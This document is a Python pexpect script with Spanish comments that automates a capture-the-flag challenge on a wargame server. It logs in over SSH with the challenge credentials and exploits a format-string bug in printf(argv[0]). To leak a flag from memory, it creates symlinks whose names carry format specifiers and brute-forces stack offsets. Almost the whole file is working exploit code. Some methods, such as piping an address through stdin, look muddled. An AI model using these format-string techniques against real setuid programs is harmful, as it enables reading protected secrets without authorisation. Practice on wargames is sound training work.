#!/usr/bin/env python3

import pexpect
import struct

print("🔥💀 OBTENIENDO LA FLAG - EXPLOIT DEFINITIVO 💀🔥")

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", encoding='latin-1', timeout=30)

# Login
child.expect(['password:', 'Password:'])
child.sendline("basic9")
child.expect(['\\$'])
print("[✓] Conectado!")

# La dirección de password es 0x0804a060
PASSWORD_ADDR = 0x0804a060

print(f"\n[*] Dirección de password[]: 0x{PASSWORD_ADDR:08x}")
print("[*] Explotando printf(argv[0])...")

# Ir a /tmp
child.sendline("cd /tmp")
child.expect(['\\$'])

# Limpiar
child.sendline("rm -f exploit* 2>/dev/null")
child.expect(['\\$'])

# MÉTODO 1: Direct Parameter Access
print("\n[1] Intentando Direct Parameter Access...")

# El password está en una dirección conocida
# Necesitamos leer de 0x0804a060

# Crear un pequeño script que pruebe diferentes offsets
exploit_script = f"""#!/bin/bash
# La dirección de password es 0x{PASSWORD_ADDR:08x}
# Probamos diferentes posiciones del stack

echo "[*] Buscando flag en diferentes posiciones del stack..."

for i in {{1..200}}; do
    # Crear symlink con format string
    ln -sf /home/basic9/basic9 "test_$i" 2>/dev/null
    
    # Ejecutar y buscar W3C
    result=$(./test_$i "%$i\$s" 2>&1 | strings | grep -oE 'W3C{{[^}}]+}}' | head -1)
    
    if [ ! -z "$result" ]; then
        echo "[!] FLAG ENCONTRADA en posición $i: $result"
        exit 0
    fi
done

echo "[*] No encontrada con %s, probando con %x..."
"""

child.sendline(f"cat > exploit.sh << 'EOF'\n{exploit_script}\nEOF")
child.expect(['\\$'])

child.sendline("chmod +x exploit.sh && ./exploit.sh")
child.expect(['\\$'], timeout=30)
output = child.before

if "W3C{" in output:
    import re
    match = re.search(r'W3C{[^}]+}', output)
    if match:
        print(f"\n🔥🔥🔥 FLAG: {match.group(0)} 🔥🔥🔥")
else:
    # MÉTODO 2: Leer directamente de la dirección
    print("\n[2] Leyendo directamente de la dirección...")
    
    # Necesitamos poner la dirección en el stack y luego leerla
    # Crear un archivo con la dirección
    addr_bytes = struct.pack("<I", PASSWORD_ADDR)
    hex_string = ''.join([f'\\x{b:02x}' for b in addr_bytes])
    
    child.sendline(f"echo -ne '{hex_string}' > addr")
    child.expect(['\\$'])
    
    # Ahora usar este archivo como input
    child.sendline("cat addr | /home/basic9/basic9 '%8$s' 2>&1 | strings")
    child.expect(['\\$'], timeout=5)
    output = child.before
    
    if "W3C" in output:
        print(f"[!] Con dirección directa: {output}")
    
    # MÉTODO 3: Explotar el bug de otra forma
    print("\n[3] Método alternativo - leyendo memoria secuencialmente...")
    
    # El programa lee la flag y la guarda en password[]
    # Luego imprime argv[0] si hay argumentos
    # Podemos leer el BSS completo
    
    for i in range(130, 180):  # Rango probable donde está en el stack
        child.sendline(f"ln -sf /home/basic9/basic9 'exp_{i}' 2>/dev/null")
        child.expect(['\\$'], timeout=1)
        
        child.sendline(f"./exp_{i} '%{i}$s' 2>&1 | strings -n 10 | head -5")
        child.expect(['\\$'], timeout=2)
        output = child.before
        
        if "W3C" in output:
            print(f"\n[!] Encontrado en posición {i}:")
            print(output)
            
            # Obtener la flag completa
            child.sendline(f"./exp_{i} '%{i}$s' 2>&1 | strings")
            child.expect(['\\$'], timeout=2)
            full = child.before
            
            import re
            match = re.search(r'W3C{[^}]+}', full)
            if match:
                print(f"\n🔥🔥🔥 FLAG: {match.group(0)} 🔥🔥🔥")
                break

# MÉTODO FINAL: Usar el bug más simple
print("\n[4] Método más simple...")

# El programa hace printf(argv[0]) cuando argc > 1
# argv[0] es el nombre del programa
# Si creamos un symlink con % en el nombre, se interpretará como format string

child.sendline("ln -sf /home/basic9/basic9 '%134$s' 2>/dev/null")
child.expect(['\\$'])

child.sendline("./'%134$s' dummy 2>&1 | cat")
child.expect(['\\$'], timeout=5)
output = child.before

# La flag debe estar en algún lugar de la salida
lines = output.split('\n')
for line in lines:
    if len(line) > 10 and not "Bad usage" in line:
        # Verificar si es ASCII imprimible
        if all(32 <= ord(c) < 127 or c in '\n\r\t' for c in line[:50]):
            if "W3C" in line:
                print(f"[!] FLAG: {line}")

child.close()
print("\n💀 FIN 💀")